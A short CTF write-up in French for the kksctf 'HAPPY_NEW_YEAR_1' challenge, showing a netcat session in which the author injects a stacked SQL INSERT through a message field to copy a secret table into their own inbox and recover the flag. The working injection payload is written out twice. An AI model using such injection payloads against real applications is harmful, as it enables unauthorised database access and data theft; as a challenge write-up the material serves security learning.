# HAPPY_NEW_YEAR_1
```
$> ncat tasks.kksctf.ru 30040
Hi, this is secret Santa 🎅
You can send a gift to a stranger and make him a pleasant surprise for the new year 🎊.

====================
[1] Sign up
[2] Sign in
[3] Exit

Option> 1
Enter username: renecoty
Enter password: france4ever
You have successfully registered 😉
```
On se crée un compte et on envoie un message
```
Logged in!

====================
[1] Send a secret message, secret Santa will deliver it 🎅🎁🎅🎁
[2] Inbox
[3] Show participants
[4] Exit

Option> 1
```
On fait notre petite injection sql des familles
```
====================
Yohohoho! Who will be honored with your letter?
Enter username: a
What do you wish him in the coming year?
Input message: "); INSERT INTO messages (to_user, letter) VALUES ("renecoty",(SELECT GROUP_CONCAT(key,",") FROM key));--
Congratulations, your letter has already been delivered!
Happy new year to you! Yohohoho🎅
```
l'injection sql envoie dans notre inbox la key de la table key :
`"); INSERT INTO messages (to_user, letter) VALUES ("renecoty",(SELECT GROUP_CONCAT(key,",") FROM key));--`
et on va voir dans l'inbox :)
```
====================
[1] Send a secret message, secret Santa will deliver it 🎅🎁🎅🎁
[2] Inbox
[3] Show participants
[4] Exit

Option> 2

====================
Yohohoho!
Your inbox:
Letter: 2
Letter: s
Letter: jjmab,lynx,lunx,Anna,Snowman,a,kks_santa,Olof,1237,Elsa,111111111111111111111111111111111111111111111111,test,renecoty,Olof,lynx,a,a,a,renecoty,a,a
Letter: ,be happy,ww,be happy,be happy,%s,s,be happy,asd,hshs,s,123,2,2,1,a,,,s,,,jjmab,lynx,lunx,Anna,Snowman,a,kks_santa,Olof,1237,Elsa,111111111111111111111111111111111111111111111111,test,renecoty,Olof,lynx,a,a,a,renecoty,a,a,
Letter: kks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}
```
ici j'avais déjà leak les personnes à qui sont adressé les messages et les messages en eux meme
flag : `kks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}`
GG ! Enfin un qui ne fait pas partie de ceux qui ne sont rien
<:macron:784920050544017429>
